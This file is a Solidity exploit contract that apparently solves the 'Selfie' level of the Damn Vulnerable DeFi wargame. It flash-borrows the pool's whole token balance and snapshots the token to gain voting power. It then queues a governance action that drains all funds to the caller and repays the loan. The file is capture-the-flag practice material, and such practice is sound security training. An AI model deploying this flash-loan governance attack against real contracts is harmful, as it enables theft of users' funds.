// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./SelfiePool.sol";
import "./SimpleGovernance.sol";
import "../DamnValuableTokenSnapshot.sol";

contract RektSelfie {
    SelfiePool public immutable pool;
    SimpleGovernance public immutable gov;
    DamnValuableTokenSnapshot public immutable token;

    constructor(
        address poolAddress,
        address govAddress,
        address tokenAddress
    ) {
        pool = SelfiePool(poolAddress);
        gov = SimpleGovernance(govAddress);
        token = DamnValuableTokenSnapshot(tokenAddress);
    }

    function rekt() public {
        uint256 amount = token.balanceOf(address(pool));
        pool.flashLoan(amount);
    }

    function receiveTokens(address tokenAddress, uint256 amount) public {
        token.snapshot();
        gov.queueAction(
            address(pool),
            abi.encodeWithSignature("drainAllFunds(address)", tx.origin),
            0
        );
        token.transfer(address(pool), amount);
    }
}
